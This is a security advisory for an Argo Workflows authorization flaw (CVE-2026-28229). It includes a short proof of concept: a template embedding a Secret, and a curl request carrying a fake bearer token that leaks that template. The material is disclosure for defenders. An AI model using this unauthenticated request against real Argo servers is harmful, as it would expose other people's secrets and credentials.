# Unauthorized access to Argo Workflows Template

**GHSA**: GHSA-56px-hm34-xqj5 | **CVE**: CVE-2026-28229 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-200, CWE-863

**Affected Packages**:
- **github.com/argoproj/argo-workflows/v3** (go): < 3.7.11
- **github.com/argoproj/argo-workflows/v4** (go): < 4.0.2

## Description

### Summary
Workflow templates endpoints allow any client to retrieve WorkflowTemplates (and ClusterWorkflowTemplates). Any request with a `Authorization: Bearer nothing` token can leak sensitive template content, including embedded Secret manifests.

### Details

https://github.com/argoproj/argo-workflows/blob/b519c9054e66b2f0a25eec06709717bd1362f72e/server/workflowtemplate/workflow_template_server.go#L60-L78

https://github.com/argoproj/argo-workflows/blob/b519c9054e66b2f0a25eec06709717bd1362f72e/server/clusterworkflowtemplate/cluster_workflow_template_server.go#L54-L72

Informers use the server’s rest config, so they read using server SA privileges. 

https://github.com/argoproj/argo-workflows/blob/b519c9054e66b2f0a25eec06709717bd1362f72e/server/workflowtemplate/informer.go#L29-L42

https://github.com/argoproj/argo-workflows/blob/b519c9054e66b2f0a25eec06709717bd1362f72e/server/clusterworkflowtemplate/informer.go#L34-L46

### PoC
1. Create template

```yml
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: leak-workflow-template
  namespace: argo
spec:
  templates:
  - name: make-secret
    resource:
      action: create
      manifest: |
        apiVersion: v1
        kind: Secret
        metadata:
          name: leaked-secret
        type: Opaque
        data:
          password: c3VwZXJzZWNyZXQ=
```

Then apply that with `kubectl apply -f poc.yml`
2. Query Argo Server with a fake token

**Result:**

```cmd
> kubectl apply -f poc.yml
workflowtemplate.argoproj.io/leak-workflow-template created
> curl -sk -H "Authorization: Bearer nothing" \
    "https://localhost:2746/api/v1/workflow-templates/argo/leak-workflow-template"
{"metadata":{"name":"leak-workflow-template","namespace":"argo","uid":"6f91481c-df9a-4aeb-9fe3-a3fb6b12e11c","resourceVersion":"867394","generation":1,"creationTimestamp":"REDACTED","annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"argoproj.io/v1alpha1\",\"kind\":\"WorkflowTemplate\",\"metadata\":{\"annotations\":{},\"name\":\"leak-workflow-template\",\"namespace\":\"argo\"},\"spec\":{\"templates\":[{\"name\":\"make-secret\",\"resource\":{\"action\":\"create\",\"manifest\":\"apiVersion: v1\\nkind: Secret\\nmetadata:\\n  name: leaked-secret\\ntype: Opaque\\ndata:\\n  password: c3VwZXJzZWNyZXQ=\\n\"}}]}}\n"},"managedFields":[{"manager":"kubectl-client-side-apply","operation":"Update","apiVersion":"argoproj.io/v1alpha1","time":"REDACTED","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}}},"f:spec":{".":{},"f:templates":{}}}}]},"spec":{"templates":[{"name":"make-secret","inputs":{},"outputs":{},"metadata":{},"resource":{"action":"create","manifest":"apiVersion: v1\nkind: Secret\nmetadata:\n  name: leaked-secret\ntype: Opaque\ndata:\n  password: c3VwZXJzZWNyZXQ=\n"}}],"arguments":{}}}
```

### Impact
Any client can leaks Workflow Template and Cluster Workflow Template data, including secrets, artifact locations, service account usage, env vars, and resource manifests.
